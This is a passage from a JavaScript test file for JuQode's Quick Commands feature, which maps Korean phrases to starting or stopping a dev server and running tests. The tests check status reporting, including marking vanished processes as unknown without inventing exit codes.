  assert.strictEqual(repo.qcRunning(b.db, b.project.id).status, 'long_running',
    'a long-running command was recorded as an ordinary one');

  b.h['juqode:qc-stop'](null, b.project.id);
  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });
});

test('a running dev server makes 켜기 사용 불가 and 끄기 가능 — from the handle, not a guess', async () => {
  /* `19` §C4: only a server JuQode ITSELF started can be stopped, and `already_running` names
   * the pid so the user can see WHICH process the product means. */
  const b = qcBench({ 'package.json': pkg({ dev: 'node -e "setTimeout(()=>{},5000)"' }) });
  const stopBefore = b.h['juqode:qc-stop'](null, b.project.id);
  assert.strictEqual(stopBefore.ok, false);
  assert.strictEqual(stopBefore.reason, 'not-running', 'something offered to stop a server nobody started');

  await b.h['juqode:qc-run'](null, b.project.id, 'qc.dev.start', '서버 켜줘');

  const again = b.h['juqode:qc-route'](null, b.project.id, '개발 서버 켜줘');
  assert.strictEqual(again.available, false);
  assert.strictEqual(again.reason, 'already_running');
  assert.ok(again.data.pid > 0, 'the reason did not name the process it is about');

  const off = b.h['juqode:qc-route'](null, b.project.id, '개발 서버 꺼줘');
  assert.strictEqual(off.available, true, '끄기 is unavailable while a server JuQode started is up');

  b.h['juqode:qc-stop'](null, b.project.id);
  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });
  const [row] = repo.qcRunsFor(b.db, b.project.id);
  assert.strictEqual(row.status, 'stopped', 'a stopped server was recorded as finished');
});

test('the discoverability list names every rule and why each cannot run', () => {
  /* `15` TD-01: 전부 사용 불가 여도 이유와 함께 나열한다. */
  const b = qcBench({ });                                    // no package.json, no .git
  const r = b.h['juqode:qc-list'](null, b.project.id);
  assert.strictEqual(r.rules.length, 6, 'the list is the closed set');
  for (const rule of r.rules) {
    if (rule.available) continue;
    assert.ok(rule.reason, `${rule.id} is unavailable and says nothing about why`);
  }
  /* …and the terminal is always available, so "all unavailable" is not the only shape tested. */
  assert.strictEqual(r.rules.find((x) => x.id === 'qc.terminal.open').available, true);
});

test('a Quick Command whose process vanished becomes 확인 불가, not success', () => {
  /* WBS-34 for QC rows. `20`: exit_code STAYS NULL — nobody observed one. */
  const b = qcBench();
  const id = repo.beginQcRun(b.db, b.project.id, {
    phrase: '서버 켜줘', ruleId: 'qc.dev.start', command: 'npm run dev', status: 'long_running' });
  assert.deepStrictEqual(repo.reconcileQcRuns(b.db, () => true), [], 'a live run was closed');

  assert.deepStrictEqual(repo.reconcileQcRuns(b.db), [id]);
  const row = repo.qcRun(b.db, id);
  assert.strictEqual(row.status, 'unknown');
  assert.strictEqual(row.exit_code, null, 'an exit code was invented for a process nobody saw end');
});

test('a running TEST is not a dev server', async () => {
  /* The handle answers "is a dev server up?", and only a `qc.dev.start` handle may. Treating any
   * live Quick Command as a server would offer to stop a test run under the 개발 서버 끄기 card
   * — and would mark 켜기 as 이미 실행 중 while nothing was serving anything. */
  const b = qcBench({ 'package.json': pkg({ dev: 'node -e "setTimeout(()=>{},5000)"',
                                            test: 'node -e "setTimeout(()=>{},5000)"' }) });
  const started = await b.h['juqode:qc-run'](null, b.project.id, 'qc.test', '테스트 돌려줘');
  assert.strictEqual(started.ok, true);

  const off = b.h['juqode:qc-route'](null, b.project.id, '개발 서버 꺼줘');
  assert.strictEqual(off.available, false, 'a running test was offered as a server to stop');
  assert.strictEqual(off.reason, 'not_running');

  const on = b.h['juqode:qc-route'](null, b.project.id, '개발 서버 켜줘');
  assert.strictEqual(on.reason, null, 'a running test made 서버 켜기 look already-running');

  b.h['juqode:qc-stop'](null, b.project.id);
  await new Promise((res) => {
    const t = setInterval(() => { if (b.pushed.some((u) => u.ended)) { clearInterval(t); res(); } }, 20);
  });
});
